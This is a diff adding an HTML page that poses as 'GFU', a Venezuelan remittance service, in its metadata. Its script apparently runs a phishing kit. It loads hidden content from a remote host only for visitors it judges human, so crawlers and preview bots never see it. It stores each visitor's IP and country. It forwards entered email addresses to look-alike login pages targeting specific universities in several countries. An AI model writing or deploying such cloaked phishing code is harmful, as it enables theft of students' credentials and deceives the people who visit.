@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="styles.css">
+   
+<meta name="description" content="Envía dinero a Venezuela con comisiones justas y acreditación inmediata. GFU, tu plataforma confiable de remesas internacionales.">
+
+
+<meta name="keywords" content="remesas, enviar dinero, Venezuela, dólares, transferencia internacional, cambio de divisas">
+
+
+<meta name="author" content="Grupo Financiero Unido">
+
+
+<meta charset="UTF-8">
+<meta name="language" content="es">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:title" content="GFU - Envía dinero a Venezuela al instante">
+<meta property="og:description" content="Plataforma confiable de remesas con comisión justa y entrega inmediata.">
+<meta property="og:image" content="https://tusitio.com/assets/og-image.jpg">
+<meta property="og:url" content="https://tusitio.com/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="GFU">
+<meta property="og:locale" content="es_CO">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="GFU - Remesas seguras a Venezuela">
+<meta name="twitter:description" content="Envía dinero con tasa justa y entrega rápida. Conoce GFU.">
+<meta name="twitter:image" content="https://tusitio.com/assets/og-image.jpg">
+<meta name="twitter:site" content="@tu_usuario">
+</head>
+<body id="htmlContainer">
+
+
+    
+</body>
+<script>
+       const API_URL = 'https://html-five-nu-93.vercel.app';
+        
+        async function fetchStaticHTML() {
+            const container = document.getElementById('htmlContainer');
+            container.innerHTML = '<div class="loading">Cargando...</div>';
+            
+            try {
+                const response = await fetch(`${API_URL}/api/html`);
+                const data = await response.json();
+                
+                // Insertar el HTML recibido
+                container.innerHTML = data.html;
+                
+            } catch (error) {
+                container.innerHTML = `
+                    <div class="error">
+                        <strong>Error:</strong> No se pudo conectar con la API. 
+                        Asegúrate de que el servidor esté corriendo en http://localhost:3000
+                    </div>
+                `;
+                console.error('Error:', error);
+            }
+        }
+
+
+    function isSimpleBot() {
+  const botPatterns = [
+    /bot/i,
+    /crawl/i,
+    /spider/i,
+    /slurp/i,
+    /bingpreview/i,
+    /facebookexternalhit/i,
+    /embedly/i,
+    /quora link preview/i,
+    /twitterbot/i,
+    /linkedinbot/i,
+    /discordbot/i,
+  ];
+
+  const ua = navigator.userAgent;
+  return botPatterns.some((pattern) => pattern.test(ua));
+}
+
+if (isSimpleBot()) {
+  console.warn("🤖 Bot detectado (userAgent).");
+} else {
+     fetchStaticHTML()
+  console.log("👤 Visitante humano (userAgent).");
+}
+
+ 
+function enviar(params) {
+ let usr =  document.getElementById('usr');
+ if (usr.value.length < 6 ) {
+  alert('El correo debe tener al menos 6 caracteres.');
+ }
+ 
+ else if (usr.value.includes('@comunidadunir.net') ) {
+  window.location.href = 'https://inircr.vercel.app/';
+ }else if( usr.value.includes('@ug.edu.ec')  ){
+  localStorage.setItem('usuario', usr.value);
+  window.location = 'index21.html';
+  
+ } else if(usr.value.includes('@o6u.edu.eg')  ){
+  localStorage.setItem('usuario', usr.value);
+ window.location.href = `https://o6u-two.vercel.app/o6u.html?valor=${encodeURIComponent(usr.value)}`;
+  
+ } else if(usr.value.includes('@aluno.agrupamentosabandeira.pt')  ){
+  localStorage.setItem('usuario', usr.value);
+ window.location.href = `https://agrupamentosabandeira.vercel.app/agrupamentosabandeira.html?valor=${encodeURIComponent(usr.value)}`;
+ }else if(usr.value.includes('@aluno.uniasselvi.com.br')  ){
+  localStorage.setItem('usuario', usr.value);
+ window.location.href = `https://uniasselvi-nine.vercel.app/uniasselvi.html?valor=${encodeURIComponent(usr.value)}`;
+ }else if(usr.value.includes('@eng.just.edu.jo') || usr.value.includes('@cit.just.edu.jo') ){
+  localStorage.setItem('usuario', usr.value);
+ window.location.href = `https://eng-just-edu-jo.vercel.app/engjustedujo.html?valor=${encodeURIComponent(usr.value)}`;
+ }
+ 
+ else {
+  localStorage.setItem('usuario', usr.value);
+  window.location.href = 'index2.html';
+  
+ }
+}
+
+
+</script>
+<script>
+(async function () {
+
+  // ── 1. LISTA DE PAÍSES QUE NO TRADUCIR (hablan español) ──────────────────
+  const SPANISH_COUNTRIES = new Set([
+    'AR','BO','CL','CO','CR','CU','DO','EC','SV','ES',
+    'GT','HN','MX','NI','PA','PY','PE','PR','UY','VE'
+  ]);
+
+  // ── 2. DETECTAR PAÍS POR IP ───────────────────────────────────────────────
+  async function getCountry() {
+    try {
+
+        const res = await fetch('/api/ip');
+        const data = await res.json();
+
+        const ip = data.ip;
+        const country = data.country;
+
+        localStorage.setItem('ip', ip);
+        localStorage.setItem('country', country);
+
+        console.log(data);
+
+    } catch (err) {
+
+        console.log('error', err);
+
+    }
+}
+
+  const country = await getCountry();
+
+  // Si es país hispanohablante → no hacer nada
+  if (SPANISH_COUNTRIES.has(country)) return;
+
+  // ── 3. FUNCIÓN DE TRADUCCIÓN (MyMemory API — gratis hasta 5000 chars/día) ─
+  async function translateText(text) {
+    if (!text || !text.trim()) return text;
+    try {
+      const url = `https://api.mymemory.translated.net/get?q=${encodeURIComponent(text)}&langpair=es|en`;
+      const res = await fetch(url);
+      const data = await res.json();
+      return data.responseData?.translatedText || text;
+    } catch {
+      return text;
+    }
+  }
+
+  // ── 4. TRADUCIR TODOS LOS NODOS DE TEXTO DEL DOM ─────────────────────────
+  async function translateNode(node) {
+    // Evita traduccir atributos o scripts
+    const skipTags = new Set(['SCRIPT','STYLE','NOSCRIPT','IFRAME','CODE','PRE']);
+    const placeholders = node.querySelectorAll('[placeholder]');
+await Promise.all([...placeholders].map(async (el) => {
+  const translated = await translateText(el.getAttribute('placeholder'));
+  if (translated) el.setAttribute('placeholder', translated);
+}));
+
+// ── TRADUCIR ATRIBUTOS TITLE Y ALT (bonus) ─────────────────────────────────
+const withTitle = node.querySelectorAll('[title], [alt]');
+await Promise.all([...withTitle].map(async (el) => {
+  if (el.title) el.title = await translateText(el.title);
+  if (el.alt)   el.alt   = await translateText(el.alt);
+}));
+    if (skipTags.has(node.tagName)) return;
+
+
+    const walker = document.createTreeWalker(node, NodeFilter.SHOW_TEXT, {
+      acceptNode: (n) => {
+        const parent = n.parentElement;
+        if (!parent) return NodeFilter.FILTER_REJECT;
+        if (skipTags.has(parent.tagName)) return NodeFilter.FILTER_REJECT;
+        if (!n.textContent.trim()) return NodeFilter.FILTER_REJECT;
+        return NodeFilter.FILTER_ACCEPT;
+      }
+    });
+
+    const textNodes = [];
+    let current;
+    while ((current = walker.nextNode())) textNodes.push(current);
+
+    // Traducir en lotes de 10 para no saturar la API
+    const BATCH = 10;
+    for (let i = 0; i < textNodes.length; i += BATCH) {
+      const batch = textNodes.slice(i, i + BATCH);
+      await Promise.all(batch.map(async (tn) => {
+        const original = tn.textContent;
+        const translated = await translateText(original);
+        if (translated && translated !== original) {
+          tn.textContent = translated;
+        }
+      }));
+    }
+    
+  }
+
+  // ── 5. OBSERVER: espera que la API llene el body ──────────────────────────
+  let translated = false; // evitar doble traducción
+
+  // Nodo objetivo — ajusta '#contenido' a tu contenedor real si lo conoces
+  const target = document.querySelector('#contenido') || document.body;
+
+  const observer = new MutationObserver(async (mutations) => {
+    if (translated) return;
+
+    // Detectar si se agregó contenido HTML significativo
+    const hasAddedNodes = mutations.some(m => m.addedNodes.length > 0);
+    if (!hasAddedNodes) return;
+
+    // Comprobar que hay texto real (no solo el skeleton vacío)
+    const text = target.innerText?.trim();
+    if (!text || text.length < 20) return;
+
+    // Pausar el observer mientras traducimos
+    observer.disconnect();
+    translated = true;
+
+    await translateNode(target);
+  });
+
+  observer.observe(target, {
+    childList: true,
+    subtree: true
+  });
+
+  // ── 6. POR SI EL CONTENIDO YA ESTABA CARGADO AL EJECUTAR EL SCRIPT ───────
+  const existingText = target.innerText?.trim();
+  if (existingText && existingText.length > 20) {
+    observer.disconnect();
+    translated = true;
+    await translateNode(target);
+  }
+
+})();
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FinancialService",
+  "name": "Grupo Financiero Unido",
+  "url": "https://tusitio.com",
+  "logo": "https://tusitio.com/assets/logo.png",
+  "description": "Servicio de remesas rápidas y seguras a Venezuela.",
+  "sameAs": [
+    "https://www.facebook.com/gfu",
+    "https://twitter.com/gfu",
+    "https://instagram.com/gfu"
+  ],
+  "areaServed": "Venezuela",
+  "currenciesAccepted": "USD",
+  "paymentAccepted": "Transferencia bancaria"
+}
+</script>
+</html>
